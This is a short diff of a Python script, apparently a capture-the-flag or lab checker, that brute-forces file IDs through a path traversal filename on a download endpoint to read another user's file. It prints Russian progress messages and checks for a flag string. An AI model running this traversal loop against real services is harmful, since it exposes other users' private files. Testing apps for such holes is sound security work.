@@ -46,10 +46,10 @@ leaked = False
 print("Попытка brute-force атаки для получения чужого файла")
 for id in range(1, 10000):
 	file = s.get(f"{base_url}/download", params={"user_id": "2", "note_id": "2", "filename": f"../../1/1/{id}.jpg"})
-	if file.status_code != 404:
+	if "flag{user_file_leaked}" in file.text:
 		leaked = True
 		break
-	if id%100 == 0:
+	if id%1000 == 0:
 		print(f"Перебрано {id} возможных имён")
 if leaked:
 	print("[!] Утечка пользовательского файла")
